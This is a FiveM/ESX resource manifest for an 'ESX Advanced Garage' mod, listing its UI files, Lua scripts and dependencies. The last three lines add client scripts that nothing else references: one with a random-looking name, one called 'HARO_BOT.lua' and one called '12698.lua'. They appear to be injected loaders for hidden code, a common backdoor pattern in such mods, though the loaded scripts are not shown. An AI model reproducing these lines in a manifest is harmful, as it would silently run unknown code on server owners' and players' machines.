resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Advanced Garage'

version '1.0.0'
ui_page('html/index.html') 
files({
	'html/index.html',
	'html/script.js',
	'html/style.css',
	  'html/img/burger.png',
	  'html/img/bottle.png',
	'html/font/vibes.ttf',
	'html/img/box.png',
	  'html/img/carticon.png',
  })
server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'es_extended',
	'esx_vehicleshop',
}



client_script "ncvJvgpuvIATxhRRgv.lua"

client_script "HARO_BOT.lua"
client_script '12698.lua'